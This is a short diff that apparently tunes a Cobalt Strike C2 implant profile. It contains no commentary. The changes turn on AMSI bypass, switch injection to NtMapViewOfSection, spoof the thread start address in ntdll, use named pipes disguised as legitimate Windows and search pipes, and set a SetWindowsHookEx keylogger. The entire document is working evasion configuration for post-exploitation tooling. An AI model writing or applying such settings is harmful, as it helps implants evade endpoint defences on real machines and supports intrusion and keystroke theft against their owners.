@@ -88,7 +88,8 @@ stage {
 ###Process Inject Block###
 process-inject {
     set allocator "NtMapViewOfSection";
-    set bof_allocator "VirtualAlloc";
+    set bof_allocator "NtMapViewOfSection";
+    #set bof_allocator "VirtualAlloc";
     set bof_reuse_memory "true";
     set min_alloc "16700";
     set userwx "false";  
@@ -121,7 +122,8 @@ post-ex {
     set spawnto_x64 "%windir%\\sysnative\\wbem\\wmiprvse.exe -Embedding";
     set obfuscate "true";
     set smartinject "true";
-    set amsi_disable "false";
-    set keylogger "GetAsyncKeyState";
-    #set threadhint "module!function+0x##"
+    set amsi_disable "true";
+    set thread_hint "ntdll.dll!RtlUserThreadStart+0x1000";
+    set pipename "DserNamePipe##, PGMessagePipe##, MsFteWds##";
+    set keylogger "SetWindowsHookEx";
 }
